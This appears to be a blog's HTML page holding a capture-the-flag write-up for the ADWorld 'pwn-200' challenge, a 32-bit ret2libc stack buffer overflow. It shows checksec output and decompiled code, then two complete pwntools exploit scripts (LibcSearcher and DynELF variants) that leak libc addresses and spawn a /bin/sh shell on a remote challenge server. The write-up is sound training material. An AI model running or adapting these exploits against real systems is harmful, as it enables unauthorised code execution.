@@ -1,0 +1,192 @@
+
+<!DOCTYPE html>
+<html lang="default" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ADWorld PWN Challenge Area Write-up (pwn-200) - TyeYeah&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TyeYeah, CS,"> 
+    <meta name="description" content="blog on Hexo,Similar to pwn-100 but a 32-bit.
+pwn-200Attachment: pwn200Description: None
+A ret2libc without give,"> 
+    <meta name="author" content="TyeYeah"> 
+    <link rel="alternative" href="atom.xml" title="TyeYeah&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    <link rel="stylesheet" href="/css/diaspora.css">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">TyeYeah&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="Play/Stop" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ADWorld PWN Challenge Area Write-up (pwn-200)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="QR Code" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">ADWorld PWN Challenge Area Write-up (pwn-200)</h1>
+        <div class="stuff">
+            <span>August 07, 2020</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/buffer-overflow/">buffer overflow</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/linux/">linux</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/">pwn</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/rop/">rop</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/stack-overflow/">stack overflow</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>Similar to <code>pwn-100</code> but a 32-bit.</p>
+<h2 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h2><p>Attachment: <a href="/filehost/apcaw/pwn200">pwn200</a><br>Description: None</p>
+<p>A <code>ret2libc</code> without given <code>.so</code> file again.</p>
+<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p>Check:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file pwn200</span><br><span class="line">pwn200: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=f73483aa5ece690e61d3f0d76dbf6defce2084ac, stripped</span><br><span class="line">$ checksec pwn200</span><br><span class="line">[*] &apos;/root/pwn200&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<p>Pseudocode:<br><code>main</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+2Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+34h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+38h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+44h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">1668048215</span>;</span><br><span class="line">  v2 = <span class="number">543518063</span>;</span><br><span class="line">  v3 = <span class="number">1478520692</span>;</span><br><span class="line">  v4 = <span class="number">1179927364</span>;</span><br><span class="line">  v5 = <span class="number">892416050</span>;</span><br><span class="line">  v6 = <span class="number">663934</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, (<span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">  write(<span class="number">1</span>, &amp;buf, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf));</span><br><span class="line">  sub_8048484();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>sub_8048484</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_8048484()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>LibcSearcher version:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">sh = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">sh = remote(<span class="string">'220.249.52.133'</span>,<span class="number">47846</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn200'</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x080484BE</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> sh.recv()</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x6c</span> + p32(<span class="number">0</span>) + p32(elf.plt[<span class="string">'write'</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">'read'</span>]) + p32(<span class="number">0x4</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(read_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'start libcsearcher'</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'read'</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'base:'</span>+hex(libc_base)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system:'</span>+hex(system_addr)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'/bin/sh:'</span>+hex(bin_sh)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x6c</span> + p32(<span class="number">0</span>) + p32(system_addr) + p32(main_addr)+ p32(bin_sh) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>When meeting multi results, we choose 0: <code>ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</code> instead of 1: <code>ubuntu-trusty-amd64-libc6 (id libc6_2.19-0ubuntu6.14_amd64)</code> and other <code>archive-old-glibc</code>. </p>
+<p>DynELF version:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'220.249.52.133'</span>,<span class="number">47846</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn200'</span>)</span><br><span class="line">write_plt=elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt=elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">start_addr=<span class="number">0x080483d0</span></span><br><span class="line">func_addr=<span class="number">0x08048484</span></span><br><span class="line">ppp_addr=<span class="number">0x080485cd</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">        payload1=<span class="string">'a'</span>*<span class="number">112</span>+p32(write_plt)+p32(func_addr)+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">        p.send(payload1)</span><br><span class="line">        data=p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">print</span> p.recvline()</span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">'./pwn200'</span>))</span><br><span class="line">sys_addr=d.lookup(<span class="string">'__libc_system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">112</span>+p32(start_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bss_addr="</span>+hex(bss_addr)</span><br><span class="line">payload3=<span class="string">'a'</span>*<span class="number">112</span>+p32(read_plt)+p32(ppp_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)+p32(sys_addr)+p32(func_addr)+p32(bss_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.send(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>Using DynELF will be faster, so we better learn it.</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.hhtjim.com/163/514216257.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.hhtjim.com/163/514213582.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://link.hhtjim.com/163/514216237.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://link.hhtjim.com/163/36664350.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://link.hhtjim.com/163/401722197.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://link.hhtjim.com/163/34228815.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://link.hhtjim.com/163/401723178.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-enable="false" data-ae="false" data-ci data-cs data-r data-o data-a data-d="false">View Comments</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-200"><span class="toc-number">1.</span> <span class="toc-text">pwn-200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Information"><span class="toc-number">2.</span> <span class="toc-text">Information</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">3.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
